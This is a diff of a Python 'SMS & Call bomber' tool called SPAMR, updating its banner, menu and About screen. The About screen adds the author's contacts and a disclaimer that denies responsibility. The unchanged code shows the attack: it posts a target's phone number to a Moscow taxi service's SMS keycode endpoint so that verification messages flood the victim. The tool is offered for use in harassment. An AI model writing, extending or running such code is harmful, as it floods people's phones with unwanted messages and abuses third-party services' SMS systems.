@@ -35,10 +35,10 @@ def logo():
     print("\u001b[33m      \___ \| |_) / _ \ | |\/| | |_) |    ")     
     print("\u001b[33m       ___) |  __/ ___ \| |  | |  _ <     ")    
     print("\u001b[33m      |____/|_| /_/   \_\_|  |_|_| \_\    ")
-    print("\u001b[33m                    v0.3                  ")
+    print("\u001b[33m                   v0.3.1                  ")
     print("\u001b[33m                                          ")
-    print("\u001b[32m   SMS/Call bomber. \u001b[34mTelegram: @BreadToBad\033[0m ")
-    print("                                          ")        
+    print("\u001b[95m     \u001b[32mSMS\u001b[95m & \u001b[32mCall bomber. \u001b[95mCTRL + Z \u001b[32mto exit   ")
+    print("                                                    ")        
 
 def clear():
     os.system("clear")
@@ -51,10 +51,10 @@ _phone = "0"
 _delay = "0"
 
 logo()
-print("\u001b[41m\u001b[32mMENU\u001b[49m:\n\u001b[33m[1]\u001b[32m SMS BOMBER.\n\u001b[33m[2]\u001b[32m UPDATE SPAMR.\n\u001b[33m[3]\u001b[32m ABOUT.\n\u001b[33m[4] \u001b[32mEXIT.\n")
+print("\u001b[41m\u001b[32mMENU\u001b[49m:\n\u001b[33m[1]\u001b[32m SMS BOMBER.\n\u001b[33m[2]\u001b[32m UPDATE SPAMR.\n\u001b[33m[3]\u001b[32m ABOUT.\n")
 menu = input("\u001b[33mEnter your choice: \033[0m")
 
-if menu == "1" or menu == "2" or menu == "3" or menu == "4":
+if menu == "1" or menu == "2" or menu == "3":
     pass
 else:
     os.system("python spamr.py")
@@ -63,17 +63,10 @@ if menu == "2":
     connected_to_internet()
     os.system("cd && cd spamr && python update_module.py")
 
-if menu == "4":
-    clear()
-    exit()
-    clear()
-    exit()
-    clear()
-    exit()
-
 if menu == "3":
     logo()
-    print("\u001b[34mДо кнопки 'About'\nу меня еще не дошли руки. \u001b[33mxD")
+    print("\u001b[33mINFO:\n\u001b[34m  SMS\u001b[95m & \u001b[34mCall bomber.\n\u001b[34m  SPAMR v0.3.1\u001b[33m\nCONTACTS:\n\u001b[34m  Telegram:\u001b[95m @BradToBad\n\u001b[34m  GitHub:\u001b[95m github.com/kirill2281337227/spamr\n\n\u001b[31mThis program was created for informational purposes ONLY!\nThe creator of this program does not bear ANY responsibility for your actions!\n\u001b[32mThanks Google Translate.\n\033[0m ")
+
     pause()
     os.system("python spamr.py")
 
@@ -113,8 +106,6 @@ delay()
 a = requests.post("https://moscow.rutaxi.ru/ajax_keycode.html", data={"l": _phone9}).json()["res"]
 print("\u001b[32mMessage sent \033[0m>>\u001b[33m  {0}.".format(a))
 delay()
-
-
 
 
 
